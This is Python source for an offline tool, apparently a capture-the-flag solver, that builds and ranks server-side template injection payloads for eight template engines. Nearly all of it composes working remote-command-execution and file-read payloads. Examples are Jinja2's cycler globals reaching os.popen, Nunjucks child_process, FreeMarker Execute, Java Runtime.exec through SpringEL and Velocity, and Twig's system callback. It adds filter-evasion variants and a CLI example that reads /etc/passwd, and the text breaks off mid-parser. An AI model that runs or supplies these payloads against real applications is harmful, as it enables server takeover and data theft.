#!/usr/bin/env python3
"""Offline, constraint-aware SSTI route planner.

This module does not render templates, import a template engine, evaluate an
expression, execute a command, or make a request.  It composes inert candidate
strings and then applies an explicit policy to them.  A candidate is never
described as universal: every row names the context features, sandbox state,
and version facts on which its documented semantic route depends.

Unknown prerequisites produce ``review`` rows.  Explicit contradictions,
version mismatches, and payload text caught by a banned-token/character policy
produce ``rejected`` rows with machine-readable blockers.  Supplying
``enabled_features`` makes that feature list closed-world; leaving it as
``None`` means the feature inventory is not yet known.

CLI examples (all output only, no request is sent)::

    ./.venv/bin/python solvers/web/webdepth_ssti_bypass_planner.py \
        jinja2 command --command id --ban-char . --ban-char _ \
        --feature jinja_default_globals --feature attr_filter --sandbox disabled --json

    ./.venv/bin/python solvers/web/webdepth_ssti_bypass_planner.py \
        pebble read --path /etc/passwd --version 3.2.3 \
        --feature literal_template --feature file_loader --json
"""

from __future__ import annotations

import argparse
from dataclasses import asdict, dataclass
import json
import re
import sys
from typing import Any, Iterable, Mapping, Sequence


MAX_VALUE_CHARS = 4096
MAX_POLICY_ITEMS = 64
MAX_POLICY_ITEM_CHARS = 128
MAX_FEATURES = 64
MAX_FACTS = 32
MAX_FACT_CHARS = 128
MAX_CANDIDATES = 96

ENGINES = (
    "jinja2",
    "nunjucks",
    "freemarker",
    "velocity",
    "thymeleaf",
    "twig",
    "pebble",
    "tornado",
)
ACTIONS = ("identify", "read", "command")
SANDBOX_STATES = ("unknown", "enabled", "disabled")

_ALIASES = {
    "jinja": "jinja2",
    "jinja-2": "jinja2",
    "free-marker": "freemarker",
    "apache-velocity": "velocity",
    "thymeleaf-spel": "thymeleaf",
    "spring-el": "thymeleaf",
    "spring_el": "thymeleaf",
    "tornado-template": "tornado",
}
_NAME_RE = re.compile(r"\A[a-z][a-z0-9_]{0,47}\Z")
_VERSION_RE = re.compile(r"\A(?:0|[1-9]\d*)(?:\.(?:0|\d+)){0,3}\Z")
_MARKER_DEFAULT = "CSCTF_SSTI_MARKER"


class SSTIBypassInputError(ValueError):
    """A planner input or CLI value is malformed, ambiguous, or over limit."""


@dataclass(frozen=True, slots=True)
class _VersionGate:
    minimum: tuple[int, ...] | None = None
    maximum: tuple[int, ...] | None = None
    maximum_exclusive: tuple[int, ...] | None = None
    rationale: str = ""

    def label(self) -> str:
        rows: list[str] = []
        if self.minimum is not None:
            rows.append(">=" + _version_text(self.minimum))
        if self.maximum is not None:
            rows.append("<=" + _version_text(self.maximum))
        if self.maximum_exclusive is not None:
            rows.append("<" + _version_text(self.maximum_exclusive))
        return ", ".join(rows)


@dataclass(frozen=True, slots=True)
class _Spec:
    candidate_id: str
    engine: str
    action: str
    payload: str
    purpose: str
    expected_observation: str
    prerequisites: tuple[str, ...]
    required_features: tuple[str, ...] = ()
    requires_unsandboxed: bool = False
    version_gate: _VersionGate | None = None
    minimum_java: int | None = None
    fact_requirements: tuple[tuple[str, str], ...] = ()


@dataclass(frozen=True, slots=True)
class PlannedCandidate:
    candidate_id: str
    engine: str
    action: str
    payload: str
    purpose: str
    expected_observation: str
    prerequisites: tuple[str, ...]
    required_features: tuple[str, ...]
    sandbox_gate: str
    version_gate: str | None
    status: str
    blockers: tuple[str, ...]
    offline: bool = True
    inert: bool = True
    rendered: bool = False
    executed: bool = False
    network_requests: int = 0

    def as_dict(self) -> dict[str, Any]:
        row = asdict(self)
        for name in ("prerequisites", "required_features", "blockers"):
            row[name] = list(row[name])
        row["rejected_reasons"] = list(self.blockers) if self.status == "rejected" else []
        return row


def _text(value: object, label: str, *, allow_empty: bool = False) -> str:
    if not isinstance(value, str):
        raise SSTIBypassInputError(f"{label} must be text")
    if (not allow_empty and not value) or len(value) > MAX_VALUE_CHARS:
        low = 0 if allow_empty else 1
        raise SSTIBypassInputError(f"{label} must contain {low}..{MAX_VALUE_CHARS} characters")
    if "\x00" in value:
        raise SSTIBypassInputError(f"{label} contains NUL")
    try:
        value.encode("utf-8")
    except UnicodeError as exc:
        raise SSTIBypassInputError(f"{label} is not valid Unicode text") from exc
    return value


def _name(value: object, label: str) -> str:
    text = _text(value, label).strip().lower().replace("-", "_")
    if not _NAME_RE.fullmatch(text):
        raise SSTIBypassInputError(f"{label} must be a lowercase identifier")
    return text


def _engine(value: object) -> str:
    if not isinstance(value, str):
        raise SSTIBypassInputError("engine must be text")
    raw = value.strip().lower()
    engine = _ALIASES.get(raw, raw)
    if engine not in ENGINES:
        raise SSTIBypassInputError(f"unknown engine {value!r}; choose one of: {', '.join(ENGINES)}")
    return engine


def _action(value: object) -> str:
    if not isinstance(value, str):
        raise SSTIBypassInputError("action must be text")
    action = value.strip().lower()
    if action not in ACTIONS:
        raise SSTIBypassInputError(f"unknown action {value!r}; choose one of: {', '.join(ACTIONS)}")
    return action


def _bounded_items(
    value: object,
    label: str,
    *,
    characters: bool = False,
    names: bool = False,
) -> tuple[str, ...]:
    if value is None:
        return ()
    if isinstance(value, str) or isinstance(value, Mapping):
        raise SSTIBypassInputError(f"{label} must be a bounded iterable, not text or a mapping")
    try:
        iterator = iter(value)  # type: ignore[arg-type]
    except TypeError as exc:
        raise SSTIBypassInputError(f"{label} must be a bounded iterable") from exc
    rows: list[str] = []
    for item in iterator:
        if len(rows) >= (MAX_FEATURES if names else MAX_POLICY_ITEMS):
            raise SSTIBypassInputError(f"{label} cap exceeded")
        if not isinstance(item, str) or not item or len(item) > MAX_POLICY_ITEM_CHARS or "\x00" in item:
            raise SSTIBypassInputError(f"{label} contains an invalid item")
        if characters and len(item) != 1:
            raise SSTIBypassInputError(f"{label} entries must be one character")
        clean = _name(item, "feature") if names else item
        if clean not in rows:
            rows.append(clean)
    return tuple(rows)


def _facts(value: object) -> dict[str, str]:
    if value is None:
        return {}
    if not isinstance(value, Mapping) or len(value) > MAX_FACTS:
        raise SSTIBypassInputError("facts must be a bounded mapping")
    out: dict[str, str] = {}
    for raw_key, raw_value in value.items():
        key = _name(raw_key, "fact name")
        if isinstance(raw_value, bool):
            item = "true" if raw_value else "false"
        elif isinstance(raw_value, int) and not isinstance(raw_value, bool):
            item = str(raw_value)
        elif isinstance(raw_value, str):
            item = _text(raw_value, f"fact {key}")
        else:
            raise SSTIBypassInputError(f"fact {key} must be text, integer, or boolean")
        if len(item) > MAX_FACT_CHARS:
            raise SSTIBypassInputError(f"fact {key} exceeds {MAX_FACT_CHARS} characters")
        out[key] = item.strip().lower()
    return out


def _version(value: object | None, label: str = "version") -> tuple[int, ...] | None:
    if value is None:
        return None
    if not isinstance(value, str) or not _VERSION_RE.fullmatch(value.strip()):
        raise SSTIBypassInputError(f"{label} must be one to four dot-separated non-negative integers")
    try:
        pieces = tuple(int(part) for part in value.strip().split("."))
    except (TypeError, ValueError, OverflowError) as exc:
        raise SSTIBypassInputError(f"invalid {label}") from exc
    if any(part > 1_000_000 for part in pieces):
        raise SSTIBypassInputError(f"{label} component is unreasonably large")
    return pieces


def _version_text(value: tuple[int, ...]) -> str:
    return ".".join(str(part) for part in value)


def _compare_version(left: tuple[int, ...], right: tuple[int, ...]) -> int:
    width = max(len(left), len(right))
    a = left + (0,) * (width - len(left))
    b = right + (0,) * (width - len(right))
    return (a > b) - (a < b)


def _literal(value: str) -> str:
    """A conservative double-quoted literal shared by the covered grammars."""

    return json.dumps(value, ensure_ascii=True)


def _split_literal(value: str, operator: str) -> str:
    at = max(1, len(value) // 2)
    return _literal(value[:at]) + operator + _literal(value[at:])


def _shell_read(path: str) -> str:
    # This is only inert text.  POSIX single-quote spelling prevents a supplied
    # path from changing the command represented by the candidate.
    return "cat -- '" + path.replace("'", "'\"'\"'") + "'"


def _hex_dunder(name: str) -> str:
    # Jinja string literals understand Python-style hexadecimal escapes.  Keep
    # the backslashes literal in this planner; nothing here decodes them.
    # json.dumps would double the backslash and therefore make Jinja see the
    # four literal characters ``\x5f``.  These names are fixed internal ASCII,
    # so quote the intended single-backslash escape directly.
    return '"' + name.replace("_", r"\x5f") + '"'


def _spec(
    candidate_id: str,
    engine: str,
    action: str,
    payload: str,
    purpose: str,
    expected: str,
    prerequisites: Sequence[str],
    **kwargs: Any,
) -> _Spec:
    if len(payload) > 32_768:
        raise SSTIBypassInputError("generated candidate exceeds internal size cap")
    return _Spec(
        candidate_id,
        engine,
        action,
        payload,
        purpose,
        expected,
        tuple(prerequisites),
        **kwargs,
    )


def _identify_specs(engine: str, marker: str) -> list[_Spec]:
    direct = _literal(marker)
    if engine in {"jinja2", "nunjucks", "twig"}:
        return [
            _spec(f"{engine}_literal", engine, "identify", "{{" + direct + "}}",
                  "render a constant marker", marker,
                  ("attacker text is parsed as template source",)),
            _spec(f"{engine}_concat", engine, "identify", "{{" + _split_literal(marker, "~") + "}}",
                  "render the same marker through template string concatenation", marker,
                  ("the engine supports its documented ~ concatenation operator",),
                  required_features=("string_concat",)),
        ]
    if engine == "freemarker":
        return [
            _spec("freemarker_literal", engine, "identify", "${" + direct + "}",
                  "render a constant FTL expression", marker,
                  ("attacker text reaches an FTL interpolation context",)),
            _spec("freemarker_concat", engine, "identify", "${" + _split_literal(marker, "+") + "}",
                  "render a concatenated FTL string", marker,
                  ("FTL string concatenation is enabled",), required_features=("string_concat",)),
        ]
    if engine == "velocity":
        left, right = marker[:max(1, len(marker) // 2)], marker[max(1, len(marker) // 2):]
        return [
            _spec("velocity_assignment", engine, "identify", f"#set($r={direct})$r",
                  "assign and render a constant Velocity reference", marker,
                  ("the injected text controls Velocity template source",)),
            _spec("velocity_adjacent_references", engine, "identify",
                  f"#set($a={_literal(left)})#set($b={_literal(right)})$a$b",
                  "compose a marker from adjacent Velocity references", marker,
                  ("#set directives and reference interpolation are enabled",),
                  required_features=("set_directive",)),
        ]
    if engine == "thymeleaf":
        return [
            _spec("thymeleaf_expression", engine, "identify", "${" + direct + "}",
                  "evaluate a constant Standard Expression", marker,
                  ("the injection point is already a Thymeleaf expression body",),
                  required_features=("expression_context",)),
            _spec("thymeleaf_text_inline", engine, "identify", "[[${" + direct + "}]]",
                  "render a constant through Thymeleaf text inlining", marker,
                  ("text inlining is enabled for attacker-controlled template source",),
                  required_features=("text_inlining",)),
        ]
    if engine == "pebble":
        return [
            _spec("pebble_literal", engine, "identify", "{{" + direct + "}}",
                  "render a constant Pebble expression", marker,
                  ("attacker text is parsed as Pebble template source",)),
            _spec("pebble_concat", engine, "identify", "{{" + _split_literal(marker, "+") + "}}",
                  "render a marker through Pebble string concatenation", marker,
                  ("the Pebble expression evaluator permits string addition",),
                  required_features=("string_concat",)),
        ]
    # Tornado templates embed Python expressions.
    return [
        _spec("tornado_literal", engine, "identify", "{{" + direct + "}}",
              "render a constant Python string expression", marker,
              ("attacker text is parsed by tornado.template",)),
        _spec("tornado_concat", engine, "identify", "{{" + _split_literal(marker, "+") + "}}",
              "render a marker via Python string concatenation", marker,
              ("Python expression concatenation is available",), required_features=("string_concat",)),
    ]


def _jinja_specs(action: str, target: str) -> list[_Spec]:
    value = _literal(target if action == "command" else _shell_read(target))
    expected = "command output if the command writes stdout" if action == "command" else "requested file contents"
    direct = "{{cycler.__init__.__globals__.os.popen(" + value + ").read()}}"
    item = ('{{cycler["__init__"]["__globals__"]["os"]["popen"]('
            + value + ')["read"]()}}')
    expr = "lipsum"
    expr = f"({expr}|attr({_hex_dunder('__globals__')}))"
    expr = f"(({expr}|attr({_literal('get')}))({_literal('os')}))"
    expr = f"({expr}|attr({_literal('popen')}))({value})"
    expr = f"({expr}|attr({_literal('read')}))()"
    attr_payload = "{{" + expr + "}}"
    suffix = "command" if action == "command" else "read"
    return [
        _spec(f"jinja_{suffix}_dot_globals", "jinja2", action, direct,
              "reach os.popen through Jinja's default cycler global", expected,
              ("the default cycler global is present", "attribute access and process creation are permitted"),
              required_features=("jinja_default_globals",), requires_unsandboxed=True),
        _spec(f"jinja_{suffix}_item_globals", "jinja2", action, item,
              "use Jinja item lookup and its attribute fallback instead of dot syntax", expected,
              ("cycler is present", "item lookup may fall back to attributes", "dunder access is permitted"),
              required_features=("jinja_default_globals", "item_lookup"), requires_unsandboxed=True),
        _spec(f"jinja_{suffix}_attr_hex", "jinja2", action, attr_payload,
              "use attr filters plus hexadecimal underscore escapes", expected,
              ("lipsum is present", "the attr filter decodes string escapes", "dangerous attributes are not sandbox-blocked"),
              required_features=("jinja_default_globals", "attr_filter"), requires_unsandboxed=True),
    ]


def _nunjucks_specs(action: str, target: str) -> list[_Spec]:
    module = "child_process" if action == "command" else "fs"
    method = "execSync" if action == "command" else "readFileSync"
    args = _literal(target) if action == "command" else _literal(target) + "," + _literal("utf8")
    tail = ".toString()" if action == "command" else ""
    source = f"return global.process.mainModule.require({_literal(module)}).{method}({args}){tail}"
    direct = "{{range.constructor(" + _literal(source) + ")()}}"
    split = "{{range[\"con\"+\"structor\"](" + _literal(source) + ")()}}"
    bracket = ("{{require(" + _literal(module) + ")[" + _literal(method[:3]) + "+"
               + _literal(method[3:]) + "](" + args + ")")
    if action == "command":
        bracket += "[\"to\"+\"String\"]()"
    bracket += "}}"
    expected = "command stdout as text" if action == "command" else "requested file contents"
    return [
        _spec(f"nunjucks_{action}_range_constructor", "nunjucks", action, direct,
              "reach the JavaScript Function constructor through range", expected,
              ("range is in the Nunjucks context", "process.mainModule remains available"),
              required_features=("constructor_access", "node_main_module"), requires_unsandboxed=True),
        _spec(f"nunjucks_{action}_split_constructor", "nunjucks", action, split,
              "construct the constructor property name at template evaluation time", expected,
              ("computed item lookup is enabled", "range and process.mainModule remain available"),
              required_features=("constructor_access", "node_main_module", "item_lookup"),
              requires_unsandboxed=True),
        _spec(f"nunjucks_{action}_context_require_brackets", "nunjucks", action, bracket,
              "use an explicitly exposed require binding and computed property names", expected,
              ("the application deliberately exposed require to the render context",),
              required_features=("require_in_context", "item_lookup"), requires_unsandboxed=True),
    ]


def _freemarker_specs(action: str, target: str) -> list[_Spec]:
    represented = target if action == "command" else _shell_read(target)
    arg = _literal(represented)
    direct = '<#assign ex="freemarker.template.utility.Execute"?new()>${ex(' + arg + ')}'
    split = ('<#assign n=("freemarker.template.utility.Exe"+"cute")>'
             '<#assign ex=n?new()>${ex(' + arg + ')}')
    pb = ('<#assign oc="freemarker.template.utility.ObjectConstructor"?new()>'
          '${oc("java.lang.ProcessBuilder",["sh","-c",' + arg + ']).start()}')
    expected = "command effect; Execute normally returns captured stdout" if action == "command" else "requested file contents"
    return [
        _spec(f"freemarker_{action}_execute", "freemarker", action, direct,
              "instantiate FreeMarker's Execute utility with ?new", expected,
              ("TemplateClassResolver permits the class", "the Execute utility is on the classpath"),
              required_features=("new_builtin", "execute_utility"), requires_unsandboxed=True),
        _spec(f"freemarker_{action}_split_execute", "freemarker", action, split,
              "construct the Execute class name from two FTL strings", expected,
              ("FTL concatenation and ?new are enabled", "TemplateClassResolver permits Execute"),
              required_features=("string_concat", "new_builtin", "execute_utility"),
              requires_unsandboxed=True),
        _spec(f"freemarker_{action}_object_constructor", "freemarker", action, pb,
              "instantiate ProcessBuilder through ObjectConstructor", "process object/effect; stdout is not implied",
              ("ObjectConstructor and ProcessBuilder are permitted by the class resolver",),
              required_features=("new_builtin", "object_constructor"), requires_unsandboxed=True),
    ]


def _velocity_specs(action: str, target: str) -> list[_Spec]:
    represented = target if action == "command" else _shell_read(target)
    arg = _literal(represented)
    suffix = "exec(" + arg + ")"
    class_tool = '$class.inspect("java.lang.Runtime").type.getRuntime().' + suffix
    reflection = '#set($x="")$x.class.forName("java.lang.Runtime").getRuntime().' + suffix
    context = "$runtime." + suffix
    rows = [
        _spec(f"velocity_{action}_class_tool", "velocity", action, class_tool,
              "use Velocity Tools ClassTool to reach Runtime", "process object/effect; stdout is not implied",
              ("$class is an exposed ClassTool", "the secure introspector permits Runtime methods"),
              required_features=("class_tool",), requires_unsandboxed=True),
        _spec(f"velocity_{action}_reflection", "velocity", action, reflection,
              "reflect from a constant String object's class", "process object/effect; stdout is not implied",
              ("class/forName reflection is not denied by the introspector",),
              required_features=("reflection",), requires_unsandboxed=True),
        _spec(f"velocity_{action}_context_runtime", "velocity", action, context,
              "invoke an application-exposed Runtime-like context object", "process object/effect; stdout is not implied",
              ("the application explicitly exposes $runtime",),
              required_features=("runtime_in_context",), requires_unsandboxed=True),
    ]
    if action == "read":
        path = _literal(target)
        nio = ('#set($p=$class.inspect("java.nio.file.Paths").type.get(' + path + '))'
               '$class.inspect("java.nio.file.Files").type.readString($p)')
        rows.insert(0, _spec("velocity_read_nio", "velocity", action, nio,
                             "read through ClassTool and java.nio.file.Files.readString", "requested file contents",
                             ("$class is exposed", "Java 11+ Files.readString is available"),
                             required_features=("class_tool",), requires_unsandboxed=True, minimum_java=11))
    return rows


def _thymeleaf_specs(action: str, target: str) -> list[_Spec]:
    if action == "read":
        path = _literal(target)
        return [
            _spec("thymeleaf_read_files", "thymeleaf", action,
                  '[[${T(java.nio.file.Files).readString(T(java.nio.file.Paths).get(' + path + '))}]]',
                  "read a path through SpringEL static type access", "requested file contents",
                  ("SpringEL type access is enabled", "Java 11+ Files.readString is available"),
                  required_features=("spring_el", "type_access", "text_inlining"),
                  requires_unsandboxed=True, minimum_java=11),
            _spec("thymeleaf_read_context_resource", "thymeleaf", action,
                  '[[${resourceReader.read(' + path + ')}]]',
                  "invoke an application-provided resource reader", "requested resource text",
                  ("the application exposes a resourceReader with an exact read method",),
                  required_features=("resource_reader_in_context", "text_inlining")),
        ]
    arg = _literal(target)
    direct = '[[${T(java.lang.Runtime).getRuntime().exec(' + arg + ')}]]'
    split = ('[[${T(java.lang.Class).forName("java.lang." + "Run" + "time")'
             '.getMethod("getRuntime").invoke(null).exec(' + arg + ')}]]')
    return [
        _spec("thymeleaf_command_runtime", "thymeleaf", action, direct,
              "invoke Runtime through SpringEL T(type) access", "process object/effect; stdout is not implied",
              ("SpringEL and static type access are enabled",),
              required_features=("spring_el", "type_access", "text_inlining"), requires_unsandboxed=True),
        _spec("thymeleaf_command_reflection_split", "thymeleaf", action, split,
              "construct the Runtime class name and use reflection", "process object/effect; stdout is not implied",
              ("SpringEL reflection and string addition are enabled", "method invocation is permitted"),
              required_features=("spring_el", "reflection", "string_concat", "text_inlining"),
              requires_unsandboxed=True),
    ]


def _twig_specs(action: str, target: str) -> list[_Spec]:
    arg = _literal(target)
    if action == "read":
        return [
            _spec("twig_read_source", "twig", action, "{{source(" + arg + ")}}",
                  "ask the configured Twig loader for template source", "requested template source",
                  ("source() is registered", "the loader permits this template name"),
                  required_features=("source_function", "template_loader")),
            _spec("twig_read_include", "twig", action, "{{include(" + arg + ")}}",
                  "include a loader-resolved template", "rendered contents of the requested template",
                  ("include() is registered", "the loader permits this template name"),
                  required_features=("include_function", "template_loader")),
            _spec("twig_read_file_excerpt", "twig", action,
                  "{{" + arg + "|file_excerpt(1,-1)}}",
                  "use Symfony's debug file_excerpt filter", "requested file excerpt",
                  ("Symfony DebugBundle registered file_excerpt",), required_features=("debug_extension",)),
        ]
    direct = "{{[" + arg + "]|filter(\"system\")}}"
    split = "{{[" + arg + "]|filter(\"sys\"~\"tem\")}}"
    sort = "{{[" + arg + ",0]|sort(\"sys\"~\"tem\")}}"
    return [
        _spec("twig_command_filter_callback", "twig", action, direct,
              "pass system as a callback to Twig's filter filter", "command output if the callback return is rendered",
              ("this Twig/PHP combination accepts arbitrary callbacks",),
              required_features=("php_callbacks", "filter_filter"), requires_unsandboxed=True),
        _spec("twig_command_split_callback", "twig", action, split,
              "compose the callback name with Twig's ~ operator", "command output if the callback return is rendered",
              ("arbitrary callback filters and string concatenation are enabled",),
              required_features=("php_callbacks", "filter_filter", "string_concat"), requires_unsandboxed=True),
        _spec("twig_command_sort_callback", "twig", action, sort,
              "use a composed callback name as the sort comparator", "callback effects; output is not universal",
              ("sort accepts a PHP callable in the observed Twig version",),
              required_features=("php_callbacks", "sort_callback", "string_concat"), requires_unsandboxed=True),
    ]


def _pebble_specs(action: str, target: str) -> list[_Spec]:
    arg = _literal(target)
    if action == "read":
        return [
            _spec("pebble_read_literal_include", "pebble", action, "{% include " + arg + " %}",
                  "use Pebble literal-template include path resolution", "included file contents",
                  ("the sink uses getLiteralTemplate", "a filesystem-capable loader is active", "include is not disallowed"),
                  required_features=("literal_template", "file_loader"),
                  version_gate=_VersionGate(maximum=(3, 2, 3),
                                            rationale="published literal-template include advisory range")),
        ]
    legacy = ('{{variable.getClass().forName("java.lang.Runtime")'
              '.getRuntime().exec(' + arg + ')}}')
    modern = ('{% set rt=(1).TYPE.forName("java.lang.Runtime") %}'
              '{{rt.getMethod("getRuntime",null).invoke(null,null).exec(' + arg + ')}}')
    return [
        _spec("pebble_command_legacy_getclass", "pebble", action, legacy,
              "use the legacy getClass/forName route", "process object/effect; stdout is not implied",
              ("a context variable named variable exists", "legacy reflection access is not blacklisted"),
              required_features=("context_object", "reflection"), requires_unsandboxed=True,
              version_gate=_VersionGate(maximum_exclusive=(3, 0, 9),
                                        rationale="legacy route documented for Pebble before 3.0.9")),
        _spec("pebble_command_type_reflection", "pebble", action, modern,
              "obtain Class through numeric TYPE and reflect Runtime", "process object/effect; stdout is not implied",
              ("TYPE, forName, getMethod, invoke, and exec all pass the method-access policy",),
              required_features=("type_reflection",), requires_unsandboxed=True),
    ]


def _tornado_specs(action: str, target: str) -> list[_Spec]:
    arg = _literal(target)
    if action == "read":
        return [
            _spec("tornado_read_pathlib_import", "tornado", action,
                  "{% import pathlib %}{{pathlib.Path(" + arg + ").read_text()}}",
                  "import pathlib in Tornado's Python template namespace", "requested file contents",
                  ("template import directives are permitted", "the process can read the path"),
                  required_features=("import_directive",), requires_unsandboxed=True),
            _spec("tornado_read_context_open", "tornado", action,
                  "{{open(" + arg + ").read()}}",
                  "use an explicitly reachable open callable", "requested file contents",
                  ("open is present in the template namespace",),
                  required_features=("builtin_open",), requires_unsandboxed=True),
        ]
    direct = "{% import os %}{{os.popen(" + arg + ").read()}}"
    split = ('{% import os %}{{getattr(os,"po"+"pen")('
             + arg + ').read()}}')
    context = "{{os.popen(" + arg + ").read()}}"
    return [
        _spec("tornado_command_import_os", "tornado", action, direct,
              "use Tornado's template import directive and Python os.popen", "command stdout",
              ("template import directives are permitted",),
              required_features=("import_directive",), requires_unsandboxed=True),
        _spec("tornado_command_split_popen", "tornado", action, split,
              "compose the popen attribute name inside a Python expression", "command stdout",
              ("imports, getattr, string addition, and calls are permitted",),
              required_features=("import_directive", "getattr", "string_concat"), requires_unsandboxed=True),
        _spec("tornado_command_context_os", "tornado", action, context,
              "use an application-exposed os object without an import directive", "command stdout",
              ("the application exposes os to the template namespace",),
              required_features=("os_in_context",), requires_unsandboxed=True),
    ]


def _action_specs(engine: str, action: str, target: str) -> list[_Spec]:
    if engine == "jinja2":
        return _jinja_specs(action, target)
    if engine == "nunjucks":
        return _nunjucks_specs(action, target)
    if engine == "freemarker":
        return _freemarker_specs(action, target)
    if engine == "velocity":
        return _velocity_specs(action, target)
    if engine == "thymeleaf":
        return _thymeleaf_specs(action, target)
    if engine == "twig":
        return _twig_specs(action, target)
    if engine == "pebble":
        return _pebble_specs(action, target)
    return _tornado_specs(action, target)


def _policy_blockers(payload: str, tokens: tuple[str, ...], characters: tuple[str, ...]) -> list[str]:
    folded = payload.casefold()
    blockers: list[str] = []
    for token in tokens:
        if token.casefold() in folded:
            blockers.append(f"banned token {token!r} occurs in payload")
    for character in characters:
        if character.casefold() in folded:
            blockers.append(f"banned character {character!r} occurs in payload")
    return blockers


def _candidate(
    spec: _Spec,
    *,
    banned_tokens: tuple[str, ...],
    banned_characters: tuple[str, ...],
    enabled_features: frozenset[str] | None,
    sandbox: str,
    version: tuple[int, ...] | None,
    facts: Mapping[str, str],
) -> PlannedCandidate:
    rejected = _policy_blockers(spec.payload, banned_tokens, banned_characters)
    unknown: list[str] = []

    if enabled_features is None:
        unknown.extend(f"unverified feature: {feature}" for feature in spec.required_features)
    else:
        for feature in spec.required_features:
            if feature not in enabled_features:
                rejected.append(f"required feature is not enabled: {feature}")

    if spec.requires_unsandboxed:
        if sandbox == "enabled":
            rejected.append("route requires an unsandboxed method/type policy")
        elif sandbox == "unknown":
            unknown.append("sandbox state is unknown; route requires unsandboxed access")

    gate_label: str | None = None
    if spec.version_gate is not None:
        gate_label = spec.version_gate.label()
        if version is None:
            unknown.append(f"engine version is unknown; documented gate is {gate_label}")
        else:
            gate = spec.version_gate
            if gate.minimum is not None and _compare_version(version, gate.minimum) < 0:
                rejected.append(f"engine version {_version_text(version)} is below {gate_label}")
            if gate.maximum is not None and _compare_version(version, gate.maximum) > 0:
                rejected.append(f"engine version {_version_text(version)} is outside {gate_label}")
            if gate.maximum_exclusive is not None and _compare_version(version, gate.maximum_exclusive) >= 0:
                rejected.append(f"engine version {_version_text(version)} is outside {gate_label}")

    if spec.minimum_java is not None:
        raw_java = facts.get("java_version")
        if raw_java is None:
            unknown.append(f"java_version fact is unknown; route requires Java >= {spec.minimum_java}")
        elif not re.fullmatch(r"\d{1,3}", raw_java):
            rejected.append("java_version fact is not a simple major version")
        elif int(raw_java) < spec.minimum_java:
            rejected.append(f"java_version {raw_java} is below required {spec.minimum_java}")

    for key, expected in spec.fact_requirements:
        actual = facts.get(key)
        if actual is None:
            unknown.append(f"fact {key} is unknown; expected {expected}")
        elif actual != expected:
            rejected.append(f"fact {key}={actual!r} contradicts required {expected!r}")

    if rejected:
        status = "rejected"
        blockers = tuple(dict.fromkeys(rejected + unknown))
    elif unknown:
        status = "review"
        blockers = tuple(dict.fromkeys(unknown))
    else:
        status = "compatible"
        blockers = ()
    return PlannedCandidate(
        candidate_id=spec.candidate_id,
        engine=spec.engine,
        action=spec.action,
        payload=spec.payload,
        purpose=spec.purpose,
        expected_observation=spec.expected_observation,
        prerequisites=spec.prerequisites,
        required_features=spec.required_features,
        sandbox_gate="disabled" if spec.requires_unsandboxed else "any",
        version_gate=gate_label,
        status=status,
        blockers=blockers,
    )


def plan_ssti_bypasses(
    engine: object,
    action: object,
    *,
    marker: object = _MARKER_DEFAULT,
    path: object | None = None,
    command: object | None = None,
    banned_tokens: object = (),
    banned_characters: object = (),
    enabled_features: object | None = None,
    sandbox: object = "unknown",
    version: object | None = None,
    facts: object | None = None,
) -> dict[str, Any]:
    """Compose, gate, and rank inert SSTI candidates.

    ``enabled_features=None`` means the feature inventory is unknown and yields
    review blockers.  Any explicit iterable, including an empty one, is a
    closed-world feature list.  Payload policy checks are case-insensitive and
    apply to the final composed string, including the supplied path/command.
    """

    try:
        chosen_engine = _engine(engine)
        chosen_action = _action(action)
        chosen_marker = _text(marker, "marker")
        if not isinstance(sandbox, str) or sandbox.strip().lower() not in SANDBOX_STATES:
            raise SSTIBypassInputError(f"sandbox must be one of: {', '.join(SANDBOX_STATES)}")
        sandbox_name = sandbox.strip().lower()
        parsed_version = _version(version)
        token_rows = _bounded_items(banned_tokens, "banned_tokens")
        character_rows = _bounded_items(banned_characters, "banned_characters", characters=True)
        feature_rows: tuple[str, ...] | None
        if enabled_features is None:
            feature_rows = None
            feature_set = None
        else:
            feature_rows = _bounded_items(enabled_features, "enabled_features", names=True)
            feature_set = frozenset(feature_rows)
        fact_rows = _facts(facts)

        if chosen_action == "identify":
            if path is not None or command is not None:
                raise SSTIBypassInputError("identify accepts marker only; omit path and command")
            specs = _identify_specs(chosen_engine, chosen_marker)
            target_kind = "marker"
        elif chosen_action == "read":
            if command is not None:
                raise SSTIBypassInputError("read accepts path only; omit command")
            target = _text(path, "path")
            specs = _action_specs(chosen_engine, chosen_action, target)
            target_kind = "path"
        else:
            if path is not None:
                raise SSTIBypassInputError("command accepts command only; omit path")
            target = _text(command, "command")
            specs = _action_specs(chosen_engine, chosen_action, target)
            target_kind = "command"
        if not specs or len(specs) > MAX_CANDIDATES:
            raise SSTIBypassInputError("internal candidate cap exceeded")

        evaluated = tuple(
            _candidate(
                spec,
                banned_tokens=token_rows,
                banned_characters=character_rows,
                enabled_features=feature_set,
                sandbox=sandbox_name,
                version=parsed_version,
                facts=fact_rows,
            )
            for spec in specs
        )
        accepted = [row.as_dict() for row in evaluated if row.status != "rejected"]
        rejected = [row.as_dict() for row in evaluated if row.status == "rejected"]
        return {
            "engine": chosen_engine,
            "action": chosen_action,
            "target_kind": target_kind,
            "policy": {
                "banned_tokens": list(token_rows),
                "banned_characters": list(character_rows),
                "enabled_features": None if feature_rows is None else list(feature_rows),
                "feature_inventory": "unknown" if feature_rows is None else "closed_world",
                "sandbox": sandbox_name,
                "version": None if parsed_version is None else _version_text(parsed_version),
                "facts": dict(sorted(fact_rows.items())),
            },
            "accepted": accepted,
            "rejected": rejected,
            "candidate_count": len(evaluated),
            "compatible_count": sum(row.status == "compatible" for row in evaluated),
            "review_count": sum(row.status == "review" for row in evaluated),
            "rejected_count": sum(row.status == "rejected" for row in evaluated),
            "offline": True,
            "rendered": False,
            "executed": False,
            "network_requests": 0,
        }
    except SSTIBypassInputError:
        raise
    except (TypeError, ValueError, KeyError, IndexError, OverflowError, UnicodeError, RecursionError) as exc:
        raise SSTIBypassInputError(f"malformed planner input: {exc}") from exc


plan = plan_ssti_bypasses


def _fact_assignments(values: object) -> dict[str, str]:
    if values is None:
        return {}
    rows = _bounded_items(values, "fact assignments")
    out: dict[str, str] = {}
    for row in rows:
        if "=" not in row:
            raise SSTIBypassInputError("facts must use NAME=VALUE")
        key, value = row.split("=", 1)
        if not value:
            raise SSTIBypassInputError("fact value must not be empty")
        out[_name(key, "fact name")] = _text(value, "fact value")
    return out


def _build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("engine", choices=ENGINES)
    parser.add_argument("action", choices=ACTIONS)
    parser.add_argument("--marker", default=_MARKER_DEFAULT)
    parser.add_argument("--path")
    parser.add_argument("--command")
